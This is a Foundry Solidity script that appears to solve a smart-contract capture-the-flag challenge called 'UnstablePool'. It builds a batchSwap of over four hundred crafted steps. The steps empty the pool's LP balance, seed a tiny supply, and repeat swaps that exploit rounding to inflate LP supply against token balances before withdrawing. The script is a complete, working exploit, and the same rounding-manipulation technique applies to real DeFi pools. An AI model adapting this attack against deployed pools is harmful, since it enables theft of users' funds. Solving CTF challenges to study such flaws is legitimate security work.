// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Challenge.sol";
import "../test/Counter.t.sol";

contract CounterScript is Script {
    Challenge public challenge = Challenge(0xEF90792Cb0dae62DF63680AdfCC67cdCCd6131aE);

    UnstablePool public pool; // pool LP 0 index
    IERC20 public main; // 1 index
    IERC20 public wmain; // 2 index

    uint256 public initialBalance;

    function setUp() public {
        pool = challenge.TARGET();
        main = challenge.MAINTOKEN();
        wmain = challenge.WRAPPEDTOKEN();
    }

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        VmSafe.Wallet memory wallet = vm.createWallet(deployerPrivateKey);

        address deployer = wallet.addr;
        address player = deployer;
        console.log("deployer: %s", deployer);
        console.log("eth balance: %e", player.balance);

        vm.startBroadcast(deployerPrivateKey);

        main.approve(address(pool), type(uint256).max);
        wmain.approve(address(pool), type(uint256).max);

        console.log("invariant %e", pool.getInvariant());
        console.log("getRate   %e", pool.getRate());

        console.log("LP: %e", pool.getVirtualSupply());
        console.log("Main: %e", pool.getPoolBalance(1));
        console.log("WMain: %e", pool.getPoolBalance(2));

        int256[] memory limits = new int256[](3);
        uint256 count = 100;
        UnstablePool.BatchSwapStep[] memory steps = new UnstablePool.BatchSwapStep[](2 + 4 * count + 1); // 2 init step, 1 final step to withdraw

        // remove all LP balance from pool. all pool balance now reset to 0
        steps[0] = step(0, 1, 1e23);
        //main in, lp out 1, seed initial LP supply to 10 or 1e1
        steps[1] = step(1, 0, 10);
        for (uint256 i = 0; i < count; i++) {
            //steps to increase LP supply by 1e0, but main token still 1e1
            steps[2 + 4 * i] = step(1, 0, 1);
            steps[3 + 4 * i] = step(2, 1, 11);
            steps[4 + 4 * i] = step(1, 2, 9);
            steps[5 + 4 * i] = step(1, 2, 1);
        }
        //final step to refund all LP. LPin = LP * MainOut / (M + W)
        steps[2 + 4 * count] = step(1, 0, 1e23);

        // steps[1] = step(1, 0, 11);
        // steps[2] = step(1, 0, 1);
        // steps[3] = step(2, 1, 11);
        // steps[4] = step(1, 2, 9);
        // steps[5] = step(1, 2, 1);

        // steps[6] = step(1, 0, 1);
        // steps[7] = step(2, 1, 11);
        // steps[8] = step(1, 2, 9);
        // steps[9] = step(1, 2, 1);

        console.log("--BEGIN--");
        pool.batchSwap(UnstablePool.SwapKind.GIVEN_OUT, steps, player, limits);

        console.log("LP: %e", pool.getVirtualSupply());
        console.log("Main: %e", pool.getPoolBalance(1));
        console.log("WMain: %e", pool.getPoolBalance(2));

        console.log("solved", challenge.isSolved());

        vm.stopBroadcast();
    }

    function step(uint256 indexIn, uint256 indexOut, uint256 amount)
        internal
        returns (UnstablePool.BatchSwapStep memory step)
    {
        step.assetInIndex = indexIn;
        step.assetOutIndex = indexOut;
        step.amount = amount;
    }
}
